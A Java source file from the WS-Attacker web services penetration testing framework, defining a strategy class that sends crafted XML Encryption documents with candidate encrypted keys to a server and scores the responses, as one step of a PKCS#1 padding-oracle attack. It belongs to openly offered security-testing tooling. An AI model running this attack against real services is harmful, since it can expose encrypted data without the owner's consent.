/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Dennis Kupser
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */

package wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.strategy;

import org.apache.log4j.Logger;
import org.w3c.dom.Document;
import wsattacker.library.signatureWrapping.util.exception.InvalidPayloadException;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.request.OracleRequest;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.base.response.OracleResponse;
import wsattacker.library.xmlencryptionattack.attackengine.oracle.concrete.pkcs1.PKCS1Oracle;
import wsattacker.library.xmlencryptionattack.avoidingengine.wrappingoracles.weakness.EncryptedKeyRefWeakness;
import wsattacker.library.xmlencryptionattack.encryptedelements.ElementAttackProperties;
import wsattacker.library.xmlencryptionattack.encryptedelements.key.EncryptedKeyElement;
import wsattacker.library.xmlencryptionattack.util.ServerSendCommandIF;
import static wsattacker.library.xmlutilities.dom.DomUtilities.domToString;

/**
 * @author Dennis
 */
public class NoEncryptedKeyRefStrategy
    extends AbstractPKCS1Strategy
{
	private static final Logger LOG = Logger.getLogger( NoEncryptedKeyRefStrategy.class );

    public NoEncryptedKeyRefStrategy( final PKCS1Oracle pkcs1Oracle )
    {
        this.m_PKSC1Oracle = pkcs1Oracle;

        if ( !( m_PKSC1Oracle.getAttackPayload() instanceof EncryptedKeyElement ) )
            throw new IllegalArgumentException( "PKCS1ErrorOracle defined but no encryptedkey attack palyoad set" );
        else
        {
            ElementAttackProperties attackProps = m_PKSC1Oracle.getAttackPayload().getAttackProperties();
            EncryptedKeyRefWeakness.deleteOldEncKeyReference( attackProps.getAttackPayloadElement() );
            this.m_AttackPayloadKeyDmy = new EncryptedKeyElement( attackProps.getAttackPayloadElement() );
        }
    }

    @Override
    public OracleResponse handleRequest( ServerSendCommandIF serverSendCmnd, OracleRequest request )
    {
        OracleResponse respMaxScore = null;
        String responseServer = null;
        OracleResponse resp = new OracleResponse();
        Document attackDocument = m_AttackPayloadKeyDmy.getEncryptedElement().getOwnerDocument();
        m_AttackPayloadKeyDmy.getCipherDataChild().setEncryptedData( request.getEncryptedKeyBase64() );

        try
        {
            m_PKSC1Oracle.handleTimeStamp( attackDocument );
        }
        catch ( InvalidPayloadException ex )
        {
            LOG.error(ex);
        }
        responseServer = serverSendCmnd.send( domToString( attackDocument ) );
        resp.setResponse( responseServer );
        respMaxScore =
            m_PKSC1Oracle.getOracleBehaviour().compareServerRespWithUserClassification( resp, m_AttackPayloadKeyDmy );

        return respMaxScore;
    }

}
